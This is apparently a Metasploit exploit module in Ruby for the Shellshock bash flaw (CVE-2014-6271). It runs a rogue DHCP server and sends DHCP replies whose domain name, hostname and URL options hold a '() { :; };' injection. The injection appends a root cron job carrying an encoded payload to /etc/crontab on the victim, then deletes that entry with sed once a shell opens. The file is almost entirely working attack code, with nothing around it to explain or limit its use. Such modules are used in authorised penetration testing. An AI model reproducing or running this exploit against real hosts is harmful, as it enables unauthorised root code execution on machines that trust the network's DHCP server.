# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;rex/proto/dhcp&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::DHCPServer

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Dhclient Bash Environment Variable Injection&#039;,
      &#039;Description&#039;    => %q|
        When bash is started with an environment variable that begins with the
        string "() {", that variable is treated as a function definition and
        parsed as code. If extra commands are added after the function
        definition, they will be executed immediately. When dhclient receives
        an ACK that contains a domain name or hostname, they are passed to
        configuration scripts as environment variables, allowing us to trigger
        the bash bug.

        Because of the length restrictions and unusual networking scenario at
        time of exploitation, we achieve code execution by echoing our payload
        into /etc/crontab and clean it up when we get a shell.
      |,
      &#039;Author&#039;         =>
        [
          &#039;Stephane Chazelas&#039;, # Vulnerability discovery
          &#039;egypt&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-6271&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          # 255 for a domain name, minus some room for encoding
          &#039;Space&#039;       => 200,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic bash telnet ruby&#039;,
            }
        },
      &#039;Targets&#039;        => [ [ &#039;Automatic Target&#039;, { }] ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Sep 24 2014&#039;
    ))

    deregister_options(&#039;DOMAINNAME&#039;, &#039;HOSTNAME&#039;, &#039;URL&#039;)
  end

  def on_new_session(session)
    print_status "Cleaning up crontab"
    # XXX this will brick a server some day
    session.shell_command_token("sed -i &#039;/^\\* \\* \\* \\* \\* root/d&#039; /etc/crontab")
  end

  def exploit
    hash = datastore.copy
    # Quotes seem to be completely stripped, so other characters have to be
    # escaped
    p = payload.encoded.gsub(/([<>()|&#039;&;$])/) { |s| Rex::Text.to_hex(s) }
    echo = "echo -e #{(Rex::Text.to_hex("*") + " ") * 5}root #{p}>>/etc/crontab"
    hash[&#039;DOMAINNAME&#039;] = "() { :; };#{echo}"
    if hash[&#039;DOMAINNAME&#039;].length > 255
      raise ArgumentError, &#039;payload too long&#039;
    end

    hash[&#039;HOSTNAME&#039;] = "() { :; };#{echo}"
    hash[&#039;URL&#039;] = "() { :; };#{echo}"
    start_service(hash)

    begin
      while @dhcp.thread.alive?
        sleep 2
      end
    ensure
      stop_service
    end
  end

end

